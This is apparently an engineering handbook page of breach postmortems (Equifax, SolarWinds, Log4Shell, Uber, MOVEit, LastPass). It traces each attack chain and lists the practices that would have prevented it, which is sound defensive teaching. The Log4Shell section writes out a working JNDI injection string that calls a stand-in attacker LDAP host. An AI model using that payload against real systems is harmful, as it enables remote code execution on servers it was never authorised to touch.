# Security Breach Engineering Lessons

| Attribute | Value |
|-----------|-------|
| Domain | Case Studies > Postmortems |
| Importance | High |
| Last Updated | 2026-03-10 |
| Cross-ref | [Security Section](../../08-security/), [Dependency Scanning](../../08-security/dependency-and-supply-chain/), [SAST/DAST](../../08-security/security-testing/) |

---

## Core Concepts

Security breaches are engineering failures, not just security failures. Each breach below reveals systemic gaps in development practices, dependency management, or infrastructure design that engineering teams can prevent.

### 1. Equifax Data Breach (September 2017)

**Technical root cause:** Equifax failed to patch Apache Struts CVE-2017-5638, a critical remote code execution vulnerability in the web framework's HTTP Content-Type header parser. The vulnerability was disclosed and patched on March 7, 2017. Equifax's security team received the alert but failed to apply the patch across all systems. Attackers exploited the vulnerability on March 10, just three days later.

**How the attack worked:**
```text
Attack chain:
  Malicious HTTP request with crafted Content-Type header
    → Apache Struts OGNL injection (CVE-2017-5638)
      → Remote code execution on Equifax's dispute portal server
        → Lateral movement across internal network
          → Data exfiltration: 147.9 million records over 76 days
            → Breach undetected because SSL certificate for network monitoring had expired

Detection failure:
  Equifax's network monitoring tool used SSL inspection to detect data exfiltration.
  The SSL certificate for this inspection had expired 19 months earlier.
  No alerts were generated for the expiration or the exfiltration.
```

**Engineering practices that would have prevented it:**
- **Automated dependency scanning** in CI/CD to flag known CVEs before deployment
- **Automated patching pipelines** that apply critical security patches within 48 hours
- **Certificate lifecycle management** with automated renewal and expiration alerts
- **Network segmentation** preventing lateral movement from web-facing servers to data stores
- **Asset inventory** so that every Apache Struts instance is known and patchable

**Impact:** 147.9 million records exposed. $1.38 billion in total costs. CEO, CIO, and CISO all resigned.

---

### 2. SolarWinds Supply Chain Attack (December 2020)

**Technical root cause:** Nation-state attackers (attributed to Russia's SVR) compromised SolarWinds' build system for the Orion network monitoring platform. They injected a backdoor (SUNBURST) into the build process using a malicious tool (SUNSPOT) that hijacked MSBuild.exe during compilation.

**How the attack worked:**
```text
Attack chain:
  Attackers gain access to SolarWinds' internal network (Sept 2019)
    → Deploy SUNSPOT malware into the build environment (Oct 2019)
      → SUNSPOT monitors for MsBuild.exe processes
        → When Orion is being built, SUNSPOT injects SUNBURST into source code
          → Malicious code is compiled, signed with SolarWinds' certificate, and
             distributed through normal software update channels (Mar 2020)
            → 18,000+ customers install trojanized update
              → SUNBURST activates after 12-14 day dormancy period
                → Targets high-value networks (US government agencies, Fortune 500)

SUNBURST evasion techniques:
  - 12-14 day dormancy before activation
  - Checks process name matches expected hash (FNV-1A + XOR)
  - Checks for security tools and sandboxes before executing
  - Communicates via DNS that mimics normal SolarWinds telemetry
  - Uses legitimate SolarWinds code signing certificate
```

**Engineering practices that would have prevented it:**
- **Build system integrity verification** (reproducible builds, build provenance)
- **SLSA framework** compliance (Supply chain Levels for Software Artifacts)
- **Code signing with separate infrastructure** not accessible from build servers
- **Build system monitoring** for unexpected process injection or source code modification
- **Binary analysis** comparing compiled output against expected source
- **Least-privilege build environments** where build servers cannot modify source repositories

**Impact:** 18,000+ organizations received trojanized updates. Confirmed breaches at 9 US government agencies and 100+ private companies. The attack was undetected for 9 months.

---

### 3. Log4Shell / Log4j Vulnerability (December 2021)

**Technical root cause:** Apache Log4j 2, used in virtually every Java application, contained a critical vulnerability (CVE-2021-44228) in its JNDI (Java Naming and Directory Interface) lookup feature. A specially crafted log message could trigger remote code execution via JNDI/LDAP injection.

**How the attack worked:**
```text
Attack chain:
  Attacker sends crafted string: ${jndi:ldap://attacker.com/exploit}
    → Application logs the string using Log4j
      → Log4j evaluates the JNDI lookup expression
        → Log4j connects to attacker-controlled LDAP server
          → LDAP server returns a malicious Java class
            → Log4j loads and executes the malicious class
              → Remote code execution on the target server

Why it was so devastating:
  - Log4j is in virtually every Java application
  - The vulnerable code path triggers on ANY logged input
  - User-Agent headers, form fields, API parameters all get logged
  - Transitive dependency: most apps included Log4j indirectly
  - Many organizations did not even know they used Log4j
```

**Engineering practices that would have prevented it:**
- **Software Bill of Materials (SBOM)** to know exactly which dependencies (including transitive) are in production
- **Dependency scanning** that checks transitive dependencies, not just direct ones
- **Input sanitization** before logging (defense in depth)
- **Network egress controls** preventing production servers from making arbitrary outbound connections
- **Runtime protection** (RASP) that detects JNDI injection attempts
- **Minimal dependency principle** -- avoid using libraries with features you do not need (Log4j's JNDI lookup was rarely intentionally used)

**Impact:** Estimated 93% of enterprise cloud environments were vulnerable. Exploitation began within hours of disclosure. Classified as a 10.0 CVSS score.

---

### 4. Uber Social Engineering Breach (September 2022)

**Technical root cause:** An 18-year-old attacker purchased stolen contractor credentials from the dark web, then used MFA fatigue (sending repeated push notifications until the victim approved one) to bypass multi-factor authentication. Once inside, the attacker found a PowerShell script in an internal file share containing hardcoded admin credentials for Uber's PAM (Privileged Access Management) system.

**How the attack worked:**
```text
Attack chain:
  Purchased stolen contractor credentials from dark web
    → MFA fatigue attack: sent repeated push notifications to contractor
      → Contractor approved a push notification (social engineering via WhatsApp)
        → VPN access to Uber's internal network
          → Found PowerShell script on internal file share
            → Script contained hardcoded admin credentials for Thycotic PAM
              → Full access to AWS, GCP, Google Workspace, Slack, source code
                → Attacker announced breach in Uber's own Slack channel

Critical failures:
  1. Stolen credentials not detected (no credential monitoring)
  2. MFA fatigue not rate-limited or detected
  3. Hardcoded admin credentials in scripts on file shares
  4. No network segmentation between VPN and critical systems
  5. PAM credentials provided access to everything
```

**Engineering practices that would have prevented it:**
- **Phishing-resistant MFA** (FIDO2/WebAuthn hardware keys instead of push notifications)
- **Credential scanning** in all repositories and file shares
- **Just-in-time access** instead of persistent admin credentials
- **Network segmentation** separating VPN access from production systems
- **MFA fatigue detection** (rate limiting push notifications, requiring number matching)
- **Zero-trust architecture** requiring continuous verification, not one-time VPN authentication

**Impact:** Source code, internal tools, Slack messages, and cloud infrastructure accessed. Uber's security credibility severely damaged (second major breach after 2016 incident).

---

### 5. MOVEit Transfer Mass Exploitation (May-June 2023)

**Technical root cause:** A critical SQL injection vulnerability (CVE-2023-34362) in Progress Software's MOVEit Transfer file transfer application. The vulnerability existed in the `/human.aspx` endpoint where user input was insufficiently sanitized before being used in SQL queries.

**How the attack worked:**
```text
Attack chain:
  CL0P ransomware group discovers SQL injection in MOVEit Transfer
    → Craft HTTP request to /human.aspx with embedded SQL injection
      → SQL injection grants access to MOVEit database
        → Attackers deploy LEMURLOOT web shell for persistent access
          → Web shell provides API to list files, download data, and
             access underlying Azure Storage accounts
            → Mass automated exploitation across thousands of organizations
              → Data exfiltrated from 2,700+ organizations

SQL injection specifics:
  - Input to /human.aspx endpoint not parameterized
  - Allowed attackers to modify/access underlying database
  - Web shell installed via SQL injection-based file upload
  - Three related CVEs discovered in rapid succession
```

**Engineering practices that would have prevented it:**
- **Parameterized queries** for all database access (SQL injection prevention 101)
- **Web application firewall** (WAF) with SQL injection detection
- **Input validation** and output encoding on all user-facing endpoints
- **Least-privilege database accounts** for web application connections
- **Regular penetration testing** of file transfer and upload functionality
- **Network segmentation** isolating file transfer infrastructure from core data stores
- **DAST scanning** as part of CI/CD pipeline

**Impact:** 2,700+ organizations compromised. 93.3 million individuals' data exposed. Multiple additional SQL injection CVEs discovered in the same product during the response.

---

### 6. LastPass Breach Chain (August 2022 - March 2023)

**Technical root cause:** A two-phase attack. First, a developer's personal computer was compromised via a known vulnerability (CVE-2020-5741) in outdated Plex Media Server software. The attacker obtained access to LastPass source code repositories and an encrypted SSE-C key. Second, a senior DevOps engineer's personal machine was compromised via a keylogger, which captured credentials to an internal vault containing decryption keys for production database backups.

**How the attack worked:**
```text
Phase 1 (August 2022):
  Attacker exploits CVE-2020-5741 in Plex on developer's personal computer
    → Access to developer's corporate laptop
      → Downloads 14 source code repositories
        → Obtains encrypted SSE-C backup key

Phase 2 (November 2022 - March 2023):
  Attacker targets 1 of 4 DevOps engineers with access to decryption keys
    → Compromises personal computer, installs keylogger
      → Captures credentials for internal vault
        → Accesses and exfiltrates production database backup
          → Backup contains encrypted customer vault data
            → Vault URLs stored unencrypted, passwords encrypted
              → Older vaults used fewer PBKDF2 iterations (vulnerable to brute force)
                → $35M+ in cryptocurrency stolen from cracked vaults by 2025

Critical design weaknesses:
  1. Only 4 people had keys to all customer vault backups
  2. Personal devices used for work without endpoint security requirements
  3. No anomaly detection on backup access patterns
  4. Vault metadata (URLs) stored unencrypted
  5. Older vaults had insufficient PBKDF2 iterations (5,000 vs. 600,000+)
```

**Engineering practices that would have prevented it:**
- **Endpoint security requirements** for all devices accessing corporate resources (personal or corporate)
- **Hardware security modules (HSMs)** for encryption key management, not software vaults
- **Break-glass procedures** requiring multiple parties for backup access
- **Anomaly detection** on access to sensitive systems (backup downloads)
- **Encrypt all metadata** including URLs, not just credentials
- **Regular key rotation** and migration of older vaults to stronger encryption parameters
- **Zero-trust for personal devices** with mandatory security baselines

**Impact:** Encrypted customer vault data exfiltrated. Older vaults with weak encryption cracked offline. $35M+ in cryptocurrency thefts linked to the breach by 2025.

---

## 10 Key Lessons

1. **Patch management is survival.** Equifax was breached three days after a patch was available. Automate dependency scanning, and establish SLAs for critical patch application (48 hours for critical CVEs).

2. **Supply chain integrity requires verification at every step.** SolarWinds proved that signed software from trusted vendors can be compromised. Adopt SLSA framework, verify build provenance, and use reproducible builds.

3. **Know your transitive dependencies.** Log4Shell was devastating because organizations did not know they depended on Log4j. Generate and maintain SBOMs for all applications. Scan transitive dependencies, not just direct ones.

4. **MFA is not enough -- use phishing-resistant MFA.** Push-based MFA falls to fatigue attacks (Uber). Deploy FIDO2/WebAuthn hardware keys for privileged access. Rate-limit and monitor MFA attempts.

5. **SQL injection is still the #1 web vulnerability.** MOVEit's breach in 2023 was caused by unsanitized SQL in a file transfer product. Parameterize all queries. No exceptions. Ever.

6. **Secrets in code and scripts are time bombs.** Uber's PowerShell script with hardcoded PAM credentials gave an attacker keys to the entire kingdom. Scan all repositories and file shares for credentials continuously.

7. **Encrypt all sensitive data, including metadata.** LastPass stored URLs unencrypted in vaults, revealing which services users accessed. Encrypt everything that could be sensitive, not just passwords.

8. **Personal devices are attack vectors.** Both LastPass breaches started with compromised personal computers. Require endpoint security baselines for all devices accessing corporate resources.

9. **Defense in depth means multiple independent layers.** No single control prevented any of these breaches. Layer patching + scanning + segmentation + monitoring + access controls.

10. **Older systems carry hidden risk.** LastPass vaults with only 5,000 PBKDF2 iterations were crackable. Migrate legacy data to current security standards proactively. Do not wait for a breach to upgrade encryption parameters.

---

## Anti-Patterns

| Anti-Pattern | Impact | Fix |
|---|---|---|
| "We'll patch it later" | Equifax: 147.9M records exposed because a patch was delayed | Automated patching with 48-hour SLA for critical CVEs |
| Trusting the build pipeline | SolarWinds: build system injected malware into signed software | SLSA compliance, reproducible builds, build provenance verification |
| Ignoring transitive dependencies | Log4Shell: most apps did not know they included Log4j | SBOM generation, transitive dependency scanning |
| Push-based MFA for privileged access | Uber: MFA fatigue bypassed multi-factor authentication | FIDO2/WebAuthn hardware keys, MFA attempt rate limiting |
| SQL queries with string concatenation | MOVEit: classic SQL injection in a modern enterprise product | Parameterized queries everywhere, DAST scanning in CI/CD |
| Hardcoded credentials in scripts | Uber: PowerShell script contained admin PAM credentials | Secret scanning, just-in-time credential provisioning |
| Unencrypted metadata | LastPass: URLs stored in plaintext revealed user activity | Encrypt all potentially sensitive fields, not just the obvious ones |
| No endpoint security for personal devices | LastPass: personal Plex server was the initial attack vector | Mandatory endpoint security baselines for all access devices |
